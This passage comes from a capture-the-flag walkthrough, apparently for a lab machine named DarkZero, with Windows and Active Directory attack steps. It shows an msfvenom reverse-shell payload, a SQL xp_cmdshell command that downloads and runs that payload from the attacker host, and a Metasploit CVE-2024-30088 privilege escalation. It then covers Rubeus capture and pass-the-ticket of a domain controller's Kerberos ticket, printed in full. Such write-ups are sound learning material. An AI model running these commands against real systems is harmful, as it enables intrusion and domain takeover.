class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Windows\system32&gt; whoami /all</span><br><span class="line"></span><br><span class="line">USER INFORMATION</span><br><span class="line">----------------</span><br><span class="line"></span><br><span class="line">User Name            SID</span><br><span class="line">==================== ============================================</span><br><span class="line">darkzero-ext\svc_sql S-1-5-21-1969715525-31638512-2552845157-1103</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GROUP INFORMATION</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">Group Name                                 Type             SID                                                             Attributes                      </span><br><span class="line">========================================== ================ =============================================================== ==================================================</span><br><span class="line">Everyone                                   Well-known group S-1-1-0                                                         Mandatory group, Enabled by default, Enabled group</span><br><span class="line">BUILTIN\Users                              Alias            S-1-5-32-545                                                    Mandatory group, Enabled by default, Enabled group</span><br><span class="line">BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                                    Mandatory group, Enabled by default, Enabled group</span><br><span class="line">BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574                                                    Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\SERVICE                       Well-known group S-1-5-6                                                         Mandatory group, Enabled by default, Enabled group</span><br><span class="line">CONSOLE LOGON                              Well-known group S-1-2-1                                                         Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                                        Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\This Organization             Well-known group S-1-5-15                                                        Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT SERVICE\MSSQLSERVER                     Well-known group S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003 Enabled by default, Enabled group, Group owner</span><br><span class="line">LOCAL                                      Well-known group S-1-2-0                                                         Mandatory group, Enabled by default, Enabled group</span><br><span class="line">Authentication authority asserted identity Well-known group S-1-18-1                                                        Mandatory group, Enabled by default, Enabled group</span><br><span class="line">Mandatory Label\High Mandatory Level       Label            S-1-16-12288                                                                                    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                    State</span><br><span class="line">============================= ============================== ========</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled</span><br><span class="line">SeCreateGlobalPrivilege       Create global objects          Enabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working set Disabled</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">USER CLAIMS INFORMATION</span><br><span class="line">-----------------------</span><br><span class="line"></span><br><span class="line">User claims unknown.</span><br><span class="line"></span><br><span class="line">Kerberos support for Dynamic Access Control on this device has been disabled.</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>We don’t have <code>SeImpersonatePrivilege</code> here which limits our usual potato attacks. Let’s get a meterpreter session for more options.</p>
+<h2 id="Privilege-Escalation-CVE-2024-30088"><a href="#Privilege-Escalation-CVE-2024-30088" class="headerlink" title="Privilege Escalation - CVE-2024-30088"></a>Privilege Escalation - CVE-2024-30088</h2><p>We generate a meterpreter payload and upload it to the target:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.6 LPORT=4444 -f exe -o kujen.exe</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x64 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 510 bytes</span><br><span class="line">Final size of exe file: 7168 bytes</span><br><span class="line">Saved as: kujen.exe</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SQL &gt;&quot;DC02.darkzero.ext&quot; (dc01_sql_svc  dbo@master)&gt; execute xp_cmdshell &#x27;powershell -c iwr 10.10.16.6/kujen.exe -outfile c:/tmp/kujen.exe&#x27;;</span><br><span class="line">output</span><br><span class="line">------</span><br><span class="line">NULL</span><br><span class="line"></span><br><span class="line">SQL &gt;&quot;DC02.darkzero.ext&quot; (dc01_sql_svc  dbo@master)&gt; execute xp_cmdshell &#x27;powershell -c iex c:/tmp/kujen.exe&#x27;;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>With a meterpreter session, we run the local exploit suggester to find potential privilege escalation vectors:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/multi/recon/local_exploit_suggester</span><br><span class="line">[*] 172.16.20.2 - Collecting local exploits for x64/windows...</span><br><span class="line">/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/logging-2.4.0/lib/logging.rb:10: warning: /usr/lib/x86_64-linux-gnu/ruby/3.3.0/syslog.so was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 3.4.0.</span><br><span class="line">You can add syslog to your Gemfile or gemspec to silence this warning.</span><br><span class="line">Also please contact the author of logging-2.4.0 to request adding syslog into its gemspec.</span><br><span class="line">[*] 172.16.20.2 - 205 exploit checks are being tried...</span><br><span class="line">[+] 172.16.20.2 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.</span><br><span class="line">[+] 172.16.20.2 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.</span><br><span class="line">[+] 172.16.20.2 - exploit/windows/local/cve_2022_21882_win32k: The service is running, but could not be validated. May be vulnerable, but exploit not tested on Windows Server 2022</span><br><span class="line">[+] 172.16.20.2 - exploit/windows/local/cve_2022_21999_spoolfool_privesc: The target appears to be vulnerable.</span><br><span class="line">[+] 172.16.20.2 - exploit/windows/local/cve_2023_28252_clfs_driver: The target appears to be vulnerable. The target is running windows version: 10.0.20348.0 which has a vulnerable version of clfs.sys installed by default</span><br><span class="line">[+] 172.16.20.2 - exploit/windows/local/cve_2024_30085_cloud_files: The target appears to be vulnerable.</span><br><span class="line">[+] 172.16.20.2 - exploit/windows/local/cve_2024_30088_authz_basep: The target appears to be vulnerable. Version detected: Windows Server 2022. Revision number detected: 2113</span><br><span class="line">[+] 172.16.20.2 - exploit/windows/local/cve_2024_35250_ks_driver: The target appears to be vulnerable. ks.sys is present, Windows Version detected: Windows Server 2022</span><br><span class="line">[+] 172.16.20.2 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.</span><br><span class="line">[*] Running check method for exploit 49 / 49</span><br><span class="line">[*] 172.16.20.2 - Valid modules for session 1:</span><br><span class="line">============================</span><br><span class="line"></span><br><span class="line"> #   Name                                                           Potentially Vulnerable?  Check Result</span><br><span class="line"> -   ----                                                           -----------------------  ------------</span><br><span class="line"> 1   exploit/windows/local/bypassuac_dotnet_profiler                Yes                      The target appears to be vulnerable.</span><br><span class="line"> 2   exploit/windows/local/bypassuac_sdclt                          Yes                      The target appears to be vulnerable.</span><br><span class="line"> 3   exploit/windows/local/cve_2022_21882_win32k                    Yes                      The service is running, but could not be validated. May be vulnerable, but exploit not tested on Windows Server 2022</span><br><span class="line"> 4   exploit/windows/local/cve_2022_21999_spoolfool_privesc         Yes                      The target appears to be vulnerable.</span><br><span class="line"> 5   exploit/windows/local/cve_2023_28252_clfs_driver               Yes                      The target appears to be vulnerable. The target is running windows version: 10.0.20348.0 which has a vulnerable version of clfs.sys installed by default</span><br><span class="line"> 6   exploit/windows/local/cve_2024_30085_cloud_files               Yes                      The target appears to be vulnerable.</span><br><span class="line"> 7   exploit/windows/local/cve_2024_30088_authz_basep               Yes                      The target appears to be vulnerable. Version detected: Windows Server 2022. Revision number detected: 2113</span><br><span class="line"> 8   exploit/windows/local/cve_2024_35250_ks_driver                 Yes                      The target appears to be vulnerable. ks.sys is present, Windows Version detected: Windows Server 2022</span><br><span class="line"> 9   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.            </span><br></pre></td></tr></table></figure></div>
+
+<p>We have plenty of options here. We’ll go with <code>CVE-2024-30088</code> which is a Windows kernel elevation of privilege vulnerability. We background our meterpreter session and configure the exploit:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/local/cve_2024_30088_authz_basep) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/local/cve_2024_30088_authz_basep):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   SESSION  3                yes       The session to run this module on</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/x64/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     10.10.16.6       yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4455             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows x64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d command.</span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/local/cve_2024_30088_authz_basep) &gt; set lport 8284</span><br><span class="line">lport =&gt; 8284</span><br><span class="line">msf6 exploit(windows/local/cve_2024_30088_authz_basep) &gt; exploit</span><br><span class="line">[*] Started reverse TCP handler on 10.10.16.6:8284</span><br><span class="line">[*] Running automatic check (&quot;set AutoCheck false&quot; to disable)</span><br><span class="line">[+] The target appears to be vulnerable. Version detected: Windows Server 2022. Revision number detected: 2113</span><br><span class="line">[*] Reflectively injecting the DLL into 3092...</span><br><span class="line">[+] The exploit was successful, reading SYSTEM token from memory...</span><br><span class="line">[+] Successfully stole winlogon handle: 880</span><br><span class="line">[+] Successfully retrieved winlogon pid: 600</span><br><span class="line">[*] Sending stage (203846 bytes) to 10.129.199.110</span><br><span class="line">[*] Meterpreter session 4 opened (10.10.16.6:8284 -&gt; 10.129.199.110:59043) at 2025-10-08 01:08:20 -0400</span><br><span class="line"></span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 828 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Microsoft Windows [Version 10.0.20348.2113]</span><br><span class="line">(c) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;cd ../../users/administrators</span><br><span class="line">cd ../../users/administrators</span><br><span class="line">The system cannot find the path specified.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;cd ../../users/administrator</span><br><span class="line">cd ../../users/administrator</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator&gt;cd desktop</span><br><span class="line">cd desktop</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Desktop&gt;dir</span><br><span class="line">dir</span><br><span class="line"> Volume in drive C has no label.</span><br><span class="line"> Volume Serial Number is E415-87AD</span><br><span class="line"></span><br><span class="line"> Directory of C:\Users\Administrator\Desktop</span><br><span class="line"></span><br><span class="line">10/02/2025  01:22 PM    &lt;DIR&gt;          .</span><br><span class="line">09/29/2025  11:14 AM    &lt;DIR&gt;          ..</span><br><span class="line">10/08/2025  02:30 AM                34 user.txt</span><br><span class="line">               1 File(s)             34 bytes</span><br><span class="line">               2 Dir(s)   3,344,830,464 bytes free</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Desktop&gt;type user.txt</span><br><span class="line">type user.txt</span><br><span class="line">92a46b6f2d91d59b479b8bb659e40979</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Desktop&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>We are now SYSTEM on DC02 and we can grab the user flag.</p>
+<h2 id="Lateral-Movement-Unconstrained-Delegation"><a href="#Lateral-Movement-Unconstrained-Delegation" class="headerlink" title="Lateral Movement - Unconstrained Delegation"></a>Lateral Movement - Unconstrained Delegation</h2><p>Now that we have SYSTEM on DC02, we need to move laterally to DC01 which is the domain controller for <code>darkzero.htb</code>. We upload PowerView and check for unconstrained delegation:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Administrator\Desktop&gt; Get-DomainComputer -UnConstrained</span><br><span class="line">Get-DomainComputer -UnConstrained</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwdlastset                    : 7/29/2025 7:21:59 AM</span><br><span class="line">logoncount                    : 427</span><br><span class="line">msds-generationid             : &#123;121, 127, 59, 192...&#125;</span><br><span class="line">serverreferencebl             : CN=DC02,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=darkzero,DC=</span><br><span class="line">                                ext</span><br><span class="line">badpasswordtime               : 12/31/1600 4:00:00 PM</span><br><span class="line">distinguishedname             : CN=DC02,OU=Domain Controllers,DC=darkzero,DC=ext</span><br><span class="line">objectclass                   : &#123;top, person, organizationalPerson, user...&#125;</span><br><span class="line">lastlogontimestamp            : 10/2/2025 11:33:53 AM</span><br><span class="line">name                          : DC02</span><br><span class="line">primarygroupid                : 516</span><br><span class="line">objectsid                     : S-1-5-21-1969715525-31638512-2552845157-1000</span><br><span class="line">samaccountname                : DC02$</span><br><span class="line">localpolicyflags              : 0</span><br><span class="line">codepage                      : 0</span><br><span class="line">samaccounttype                : MACHINE_ACCOUNT</span><br><span class="line">whenchanged                   : 10/2/2025 6:33:53 PM</span><br><span class="line">accountexpires                : NEVER</span><br><span class="line">cn                            : DC02</span><br><span class="line">operatingsystem               : Windows Server 2022 Datacenter</span><br><span class="line">instancetype                  : 4</span><br><span class="line">msdfsr-computerreferencebl    : CN=DC02,CN=Topology,CN=Domain System</span><br><span class="line">                                Volume,CN=DFSR-GlobalSettings,CN=System,DC=darkzero,DC=ext</span><br><span class="line">objectguid                    : f85520d0-db6e-4a92-9ebc-f01d6d4cc268</span><br><span class="line">operatingsystemversion        : 10.0 (20348)</span><br><span class="line">lastlogoff                    : 12/31/1600 4:00:00 PM</span><br><span class="line">objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=darkzero,DC=ext</span><br><span class="line">dscorepropagationdata         : &#123;7/29/2025 2:21:28 PM, 1/1/1601 12:00:01 AM&#125;</span><br><span class="line">serviceprincipalname          : &#123;Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/DC02.darkzero.ext,</span><br><span class="line">                                ldap/DC02.darkzero.ext/ForestDnsZones.darkzero.ext,</span><br><span class="line">                                ldap/DC02.darkzero.ext/DomainDnsZones.darkzero.ext, TERMSRV/DC02...&#125;</span><br><span class="line">usncreated                    : 12293</span><br><span class="line">usercertificate               : &#123;48, 130, 6, 243...&#125;</span><br><span class="line">memberof                      : &#123;CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=darkzero,DC=ext, CN=Cert</span><br><span class="line">                                Publishers,CN=Users,DC=darkzero,DC=ext&#125;</span><br><span class="line">lastlogon                     : 10/8/2025 3:24:37 AM</span><br><span class="line">badpwdcount                   : 0</span><br><span class="line">useraccountcontrol            : SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION</span><br><span class="line">whencreated                   : 7/29/2025 2:21:27 PM</span><br><span class="line">countrycode                   : 0</span><br><span class="line">iscriticalsystemobject        : True</span><br><span class="line">msds-supportedencryptiontypes : 28</span><br><span class="line">usnchanged                    : 131113</span><br><span class="line">ridsetreferences              : CN=RID Set,CN=DC02,OU=Domain Controllers,DC=darkzero,DC=ext</span><br><span class="line">dnshostname                   : DC02.darkzero.ext</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>DC02 has the <code>TRUSTED_FOR_DELEGATION</code> flag set which means it’s configured for unconstrained delegation. We can use Rubeus to monitor for incoming TGTs. We run Rubeus in monitor mode and wait for DC01’s machine account TGT to come in:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[*] 10/8/2025 1:31:02 PM UTC - Found new TGT:</span><br><span class="line"></span><br><span class="line">  User                  :  DC01$@DARKZERO.HTB</span><br><span class="line">  StartTime             :  10/8/2025 6:31:00 AM</span><br><span class="line">  EndTime               :  10/8/2025 4:31:00 PM</span><br><span class="line">  RenewTill             :  10/15/2025 6:31:00 AM</span><br><span class="line">  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable</span><br><span class="line">  Base64EncodedTicket   :</span><br><span class="line"></span><br><span class="line">    doIFjDCCBYigAwIBBaEDAgEWooIElDCCBJBhggSMMIIEiKADAgEFoQ4bDERBUktaRVJPLkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMREFSS1pFUk8uSFRCo4IETDCCBEigAwIBEqEDAgECooIEOgSCBDZA4tGXPOXC/hNMYPqm4sD31BOfwroajVPeX/BgTeLv6uLfDUi9HAdDZxuesT6Mf/jQ6vyhHzmLbFxav897YkwKq+8poI85YwybQ3Pbe8m3D7Ss9BPTDBxUnHSqy9n6jOZ62R+3TSRUO/WgF5Dpxc99EtUKWmjGbFvQwuzH6fn/jRuEltyW69SNwtMw2IYKRnGTbHnoSkuoDsEfPwsu9e6oMub6QeRD0bjlSZLr5xkR9POEylt6JfS/RhnzvxpoM16geKZDTKxhSOWWN2o0uAtdDcLVhOtVTs00rVEStCw/FAA1dpgsUB6QfMHqBq+I3NLp0T4yUR+idY99bAOgdBi8ZPpb2bLd1eSmzR6nJmrESDZo4LWp5+amVsnqKiAz2cupzaHpq8sDiiMQhoRgKrviShXV0TGyKWmk6h71Ft9Mm9kDuIO0a67ggPVCnayAAuWaEKx8FCkImKQvZN9cg8J8nNhaeIXiEP8eZSQL2qvlrlQx7N7yRpzSLCJ4e4tzlTDkpoOsRLUjktTObj+moph9NXsIRgwQMOdYfuwfxIlYX6Ky0Rqz5KH3TKt7h6tjTaawavQAMmPCQXeCgfPqFxE6j4j8SqZekLz5pd/Iii0rHsLFHaeP6OBD0Y4e0v8WLP9Eum9TFvEZyRRUlDjL7ZqbEZ2IitPfkmetJK6qcMDbFthtLpQf9wOvZTYlzYpHoBSbQnTLfWQqCq8oiK5jUf5jk9GVSbILhz3L/1zDVtqJ+ps8FGGnMk/+cUeiK3lVRs8EFRBz5OQ6vAAjzUbHUNyO/6ifsTTOxNH489mtns9ma3h7QIe+WGt+VtSMLyRcBALwcFLDGWCfoHzwH/9YxMKNUGdxTuRQcQ7BTr7JDzmfXLtF7S9XPccdF12Ed+2IYNnPAck6HZqodQP7faewNVQEO/9wpd5vr+7CREGZbq8sy5YBAbD5vmkYxhftc8lGspizc0NQVrW5zdHUSXK2IvGTWGI8L1V+HQLjA4zWax7/NwZuqbgcnuPwAw3XWU4fr8SaHZ+x88wXY/6X3XCueWxpjbrGMkiRloobrdRd0eL9UX8N2FnYEf8A7jsS4xndKY3IliOwU+OL31XQGxFKUfUHz0a2pgAbWaDQlnd4meFd7MyV++u7r/eduKR3xQFNbh/dWcg3LsZioxyPiP8yx2heuLnOQ92QBStUBeYS3euBUe3bFuWbWieAypclnWjvJoXFEBcKBANuhYi+BwC7jaht4Osk5Oj0iv7wOgRnxlpQVCwzH+CrojIsI8SeGOKqRrkx7jRUZKEa6Vaw2lHKbJBQ9SsQHaeRdtAO11rtw42hk9wHGxK9LC1cs3vQgsrLMUyQ3xd97WGU6bSesCdA8uvPDIBbJOR9D9LOcUO5SbcY0YwUv1Z8BPmO3MtU49Kt61ei/xiGKEIrHKQQ+pYz99GH75/Njp6jo4HjMIHgoAMCAQCigdgEgdV9gdIwgc+ggcwwgckwgcagKzApoAMCARKhIgQg1iBIi6N0M++dx9EWONluC28TRnReb5hY8MqfjA1zsYahDhsMREFSS1pFUk8uSFRCohIwEKADAgEBoQkwBxsFREMwMSSjBwMFAGChAAClERgPMjAyNTEwMDgxMzMxMDBaphEYDzIwMjUxMDA4MjMzMTAwWqcRGA8yMDI1MTAxNTEzMzEwMFqoDhsMREFSS1pFUk8uSFRCqSEwH6ADAgECoRgwFhsGa3JidGd0GwxEQVJLWkVSTy5IVEI=</span><br><span class="line"></span><br><span class="line">[*] Ticket cache size: 8</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>We captured DC01’s TGT. Now we import it using Rubeus <code>ptt</code>:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">PS C:\users\administrator\desktop&gt; ./Rubeus.exe ptt /ticket:doIFjDCCBYigAwIBBaEDAgEWooIElDCCBJBhggSMMIIEiKADAgEFoQ4bDERBUktaRVJPLkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMREFSS1pFUk8uSFRCo4IETDCCBEigAwIBEqEDAgECooIEOgSCBDZA4tGXPOXC/hNMYPqm4sD31BOfwroajVPeX/BgTeLv6uLfDUi9HAdDZxuesT6Mf/jQ6vyhHzmLbFxav897YkwKq+8poI85YwybQ3Pbe8m3D7Ss9BPTDBxUnHSqy9n6jOZ62R+3TSRUO/WgF5Dpxc99EtUKWmjGbFvQwuzH6fn/jRuEltyW69SNwtMw2IYKRnGTbHnoSkuoDsEfPwsu9e6oMub6QeRD0bjlSZLr5xkR9POEylt6JfS/RhnzvxpoM16geKZDTKxhSOWWN2o0uAtdDcLVhOtVTs00rVEStCw/FAA1dpgsUB6QfMHqBq+I3NLp0T4yUR+idY99bAOgdBi8ZPpb2bLd1eSmzR6nJmrESDZo4LWp5+amVsnqKiAz2cupzaHpq8sDiiMQhoRgKrviShXV0TGyKWmk6h71Ft9Mm9kDuIO0a67ggPVCnayAAuWaEKx8FCkImKQvZN9cg8J8nNhaeIXiEP8eZSQL2qvlrlQx7N7yRpzSLCJ4e4tzlTDkpoOsRLUjktTObj+moph9NXsIRgwQMOdYfuwfxIlYX6Ky0Rqz5KH3TKt7h6tjTaawavQAMmPCQXeCgfPqFxE6j4j8SqZekLz5pd/Iii0rHsLFHaeP6OBD0Y4e0v8WLP9Eum9TFvEZyRRUlDjL7ZqbEZ2IitPfkmetJK6qcMDbFthtLpQf9wOvZTYlzYpHoBSbQnTLfWQqCq8oiK5jUf5jk9GVSbILhz3L/1zDVtqJ+ps8FGGnMk/+cUeiK3lVRs8EFRBz5OQ6vAAjzUbHUNyO/6ifsTTOxNH489mtns9ma3h7QIe+WGt+VtSMLyRcBALwcFLDGWCfoHzwH/9YxMKNUGdxTuRQcQ7BTr7JDzmfXLtF7S9XPccdF12Ed+2IYNnPAck6HZqodQP7faewNVQEO/9wpd5vr+7CREGZbq8sy5YBAbD5vmkYxhftc8lGspizc0NQVrW5zdHUSXK2IvGTWGI8L1V+HQLjA4zWax7/NwZuqbgcnuPwAw3XWU4fr8SaHZ+x88wXY/6X3XCueWxpjbrGMkiRloobrdRd0eL9UX8N2FnYEf8A7jsS4xndKY3IliOwU+OL31XQGxFKUfUHz0a2pgAbWaDQlnd4meFd7MyV++u7r/eduKR3xQFNbh/dWcg3LsZioxyPiP8yx2heuLnOQ92QBStUBeYS3euBUe3bFuWbWieAypclnWjvJoXFEBcKBANuhYi+BwC7jaht4Osk5Oj0iv7wOgRnxlpQVCwzH+CrojIsI8SeGOKqRrkx7jRUZKEa6Vaw2lHKbJBQ9SsQHaeRdtAO11rtw42hk9wHGxK9LC1cs3vQgsrLMUyQ3xd97WGU6bSesCdA8uvPDIBbJOR9D9LOcUO5SbcY0YwUv1Z8BPmO3MtU49Kt61ei/xiGKEIrHKQQ+pYz99GH75/Njp6jo4HjMIHgoAMCAQCigdgEgdV9gdIwgc+ggcwwgckwgcagKzApoAMCARKhIgQg1iBIi6N0M++dx9EWONluC28TRnReb5hY8MqfjA1zsYahDhsMREFSS1pFUk8uSFRCohIwEKADAgEBoQkwBxsFREMwMSSjBwMFAGChAAClERgPMjAyNTEwMDgxMzMxMDBaphEYDzIwMjUxMDA4MjMzMTAwWqcRGA8yMDI1MTAxNTEzMzEwMFqoDhsMREFSS1pFUk8uSFRCqSEwH6ADAgECoRgwFhsGa3JidGd0GwxEQVJLWkVSTy5IVEI=</span><br><span class="line">./Rubeus.exe ptt 